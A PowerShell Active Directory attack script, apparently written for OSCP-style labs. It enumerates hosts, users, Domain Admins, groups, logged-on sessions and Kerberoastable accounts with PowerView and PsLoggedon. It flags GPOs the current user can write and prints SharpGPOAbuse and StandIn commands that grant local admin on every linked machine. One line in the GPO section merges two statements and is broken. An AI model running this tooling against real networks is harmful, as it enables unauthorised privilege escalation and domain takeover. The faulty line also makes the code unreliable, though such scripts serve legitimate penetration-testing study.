# ===============================
# AD ENUM REPORT (OSCP STYLE - FINAL)
# powershell -NoProfile -ExecutionPolicy Bypass -File ./adenum.ps1
# Prerequisite: PowerView.ps1 dan PsLoggedon64.exe
# ===============================

$outfile = "$env:USERPROFILE\ad_enum_report.txt"
Remove-Item $outfile -ErrorAction SilentlyContinue

function write-section {
    param($title)
    Add-Content $outfile "`n========== $title =========="
}

Write-Host "[+] Saving report to $outfile"

# ===============================
# LOAD POWERVIEW
# ===============================
if (-not (Get-Command Get-DomainUser -ErrorAction SilentlyContinue)) {
    try {
        . .\PowerView.ps1
    } catch {
        Write-Host "[!] PowerView.ps1 not found!"
        exit
    }
}

# ===============================
# GET DOMAIN (biar konsisten format user@domain)
# ===============================
$domain = (Get-Domain).Name

# ===============================
# 1. HOSTS
# ===============================
write-section "HOSTS"

$hosts = Get-DomainComputer

if ($hosts.Count -eq 0) {
    Add-Content $outfile "Null"
} else {
    $hosts | ForEach-Object {
        $ip = ""
        try {
            $ip = ([System.Net.Dns]::GetHostAddresses($_.dnshostname) |
            Where-Object {$_.AddressFamily -eq "InterNetwork"} |
            Select -First 1).IPAddressToString
        } catch {}

        "$($_.dnshostname);$($_.OperatingSystem);$ip" | Add-Content $outfile
    }
}

# ===============================
# 2. USERS
# ===============================
write-section "USERS"

$users = Get-DomainUser

if ($users.Count -eq 0) {
    Add-Content $outfile "Null"
} else {
    $users | ForEach-Object {
        "$($_.samaccountname)@$domain" | Add-Content $outfile
    }
}

# ===============================
# 3. DOMAIN ADMINS
# ===============================
write-section "DOMAIN ADMINS"

$da = Get-DomainGroupMember "Domain Admins"

if ($da.Count -eq 0) {
    Add-Content $outfile "Null"
} else {
    $da | ForEach-Object {
        "$($_.MemberName)" | Add-Content $outfile
    }
}

# ===============================
# 4. GROUPS
# ===============================
write-section "GROUPS"

$groups = Get-DomainGroup

if ($groups.Count -eq 0) {
    Add-Content $outfile "Null"
} else {
    $groups | Select -ExpandProperty Name | Add-Content $outfile
}

# ===============================
# 5. GPO (ENUM + PRIVILEGE CHECK)
# ===============================
write-section "GPO"

$gpos = Get-DomainGPO if ($gpos.Count -eq 0) { Add-Content $outfile "Null" } else { $gpos | Select -ExpandProperty displayname | Add-Content $outfile }

$me = whoami
$gpos = Get-DomainGPO

if ($gpos.Count -eq 0) {
    Add-Content $outfile "Null"
    return
}

Add-Content $outfile "`n[+] Current User: $me"
Add-Content $outfile "`n[+] GPO Enumeration + Privilege Mapping:`n"

$domain = Get-DomainObject -SearchScope Base
$domainLinks = $domain.gplink

$ous = Get-DomainOU
$sites = Get-DomainSite

$foundExploit = $false

foreach ($gpo in $gpos) {

    $acls = Get-DomainObjectAcl -Identity $gpo.distinguishedname -ResolveGUIDs | Where-Object {
        $_.ActiveDirectoryRights -match "CreateChild|WriteProperty|DeleteChild|DeleteTree|WriteDacl|WriteOwner"
    }

    foreach ($acl in $acls) {

        try {
            $identity = ConvertFrom-SID $acl.SecurityIdentifier
        } catch {
            continue
        }

        if ($identity -ne $me) { continue }

        # ===============================
        # Scope detection
        # ===============================
        $scope = @()

        if ($domainLinks -like "*$($gpo.name)*") {
            $scope += "Domain"
        }

        foreach ($ou in $ous) {
            if ($ou.gplink -like "*$($gpo.name)*") {
                $scope += "OU:$($ou.name)"
            }
        }

        foreach ($site in $sites) {
            if ($site.gplink -like "*$($gpo.name)*") {
                $scope += "Site:$($site.name)"
            }
        }

        if ($scope.Count -eq 0) { $scope = "Unknown" } else { $scope = $scope -join "," }

        # ===============================
        # Decide exploitability
        # ===============================
        $impact = ""
        if ($scope -match "Domain") {
            $impact = "HIGH (Domain-wide takeover possible)"
        } elseif ($scope -match "OU") {
            $impact = "MEDIUM (Lateral movement possible)"
        } else {
            $impact = "LOW/UNKNOWN"
        }

        $foundExploit = $true

        # ===============================
        # OUTPUT
        # ===============================
        Add-Content $outfile "------------------------------------"
        Add-Content $outfile "[!] EXPLOITABLE GPO FOUND"
        Add-Content $outfile "User    : $identity"
        Add-Content $outfile "GPO     : $($gpo.displayname)"
        Add-Content $outfile "Rights  : $($acl.ActiveDirectoryRights)"
        Add-Content $outfile "Scope   : $scope"
        Add-Content $outfile "Impact  : $impact"
        Add-Content $outfile "------------------------------------"
        Add-Content $outfile ""
    }
}

# ===============================
# Summary
# ===============================
if (-not $foundExploit) {
    Add-Content $outfile "[+] No exploitable GPO rights found for current user"
} else {
    Add-Content $outfile "Choose attack method"
    
    Add-Content $outfile "   Option A - SharpGPOAbuse"
    Add-Content $outfile "   Example:"
    Add-Content $outfile "   SharpGPOAbuse.exe --AddLocalAdmin --UserAccount $me --GPOName <TARGET_GPO>"
    Add-Content $outfile "   → Result: user becomes local admin on all linked machines"
    
    Add-Content $outfile ""
    Add-Content $outfile "   Option B - StandIn (enumeration + modification)"
    Add-Content $outfile "   - List GPOs:"
    Add-Content $outfile "     StandIn.exe --gpo"
    Add-Content $outfile "   - Check ACL:"
    Add-Content $outfile "     StandIn.exe --gpo --filter <GPO_NAME> --acl"
    Add-Content $outfile "   - Abuse:"
    Add-Content $outfile "     StandIn.exe --gpo --filter <GPO_NAME> --localadmin $me"

}

# ===============================
# 6. BLOODHOUND-LIKE (STEALTH LIMITATION)
# ===============================
write-section "RDP Access"
Add-Content $outfile "Null"

write-section "Local Admin Access"
Add-Content $outfile "Null"

write-section "Shortest Path to Domain Admins"
Add-Content $outfile "Null"

# ===============================
# 7. ACTIVE SESSIONS (PsLoggedon)
# ===============================
write-section "ACTIVE SESSIONS"

$results = @()

try {
    $targets = Get-DomainComputer | Select -ExpandProperty dnshostname
} catch {
    $targets = @()
}

foreach ($target in $targets) {

    $tmp = "$env:TEMP\pslog_$target.txt"

    try {
        # Run via CMD + redirect output (anti hang)
        cmd /c "PsLoggedon64.exe \\$target -accepteula > $tmp 2>&1"

        if (Test-Path $tmp) {

            $content = Get-Content $tmp

            foreach ($line in $content) {
            
                if ($line -match "\\" -and $line -notmatch "Users logged on") {
            
                    $clean = $line.Trim()
                    $short = $target.Split('.')[0]
            
                    $results += "$short;$clean"
                }
            }

            Remove-Item $tmp -ErrorAction SilentlyContinue
        }

    } catch {}
}

if ($results.Count -eq 0) {
    Add-Content $outfile "Null"
} else {
    $results | Sort-Object -Unique | Add-Content $outfile
}

# ===============================
# 8. KERBEROASTABLE USERS
# ===============================
write-section "KERBEROASTABLE USERS"

$spn = Get-DomainUser -SPN
$domainName = (Get-Domain).dnsroot

if ($spn.Count -eq 0) {
    Add-Content $outfile "Null"
} else {
    $spn | ForEach-Object {
        "$($_.samaccountname)@$domainName;$($_.serviceprincipalname)" | Add-Content $outfile
    }
}

# ===============================
# DONE
# ===============================
Write-Host "[+] DONE!"
Write-Host "[+] Report saved to: $outfile"
